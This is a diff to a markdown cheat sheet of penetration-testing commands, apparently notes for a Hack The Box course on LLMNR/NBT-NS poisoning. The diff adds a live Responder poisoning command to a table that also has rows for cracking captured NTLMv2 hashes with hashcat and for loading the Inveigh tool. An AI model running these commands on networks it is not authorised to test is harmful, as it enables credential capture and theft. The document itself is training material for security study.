@@ -20,7 +20,7 @@
 
 | Command                                                      | Description                                                  |
 | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
+| `sudo responder -I ens224 -Pv`                                               | Used from a Linux-based host. [LLMNR/NBT-NS Poisoning - from Linux - Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.]([LLMNR/NBT-NS Poisoning - from Linux](https://academy.hackthebox.com/module/143/section/1272)) |
 | `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. [LLMNR/NBT-NS Poisoning - from Linux](https://academy.hackthebox.com/module/143/section/1272) |
 | `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
 | `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
